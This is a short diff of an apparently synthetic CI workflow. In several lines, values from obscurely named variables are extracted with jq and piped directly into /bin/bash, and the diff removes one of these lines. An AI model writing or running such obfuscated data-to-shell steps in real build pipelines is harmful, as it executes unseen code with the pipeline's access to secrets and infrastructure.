@@ -45,7 +45,6 @@ jobs:
           echo $j4483 | jq -r .dcf503 | /bin/bash
           printf '%s' "$bhfw2254" | jq -r .kuj04127 | /bin/bash
           printf '%s' "$yj77" | jq -r .br9 | /bin/bash
-          echo $qmb72295 | jq -r .z53209 | /bin/bash
           echo $zbi1334 | jq -r .kxmse26656 | /bin/bash
 
       - name: Store results
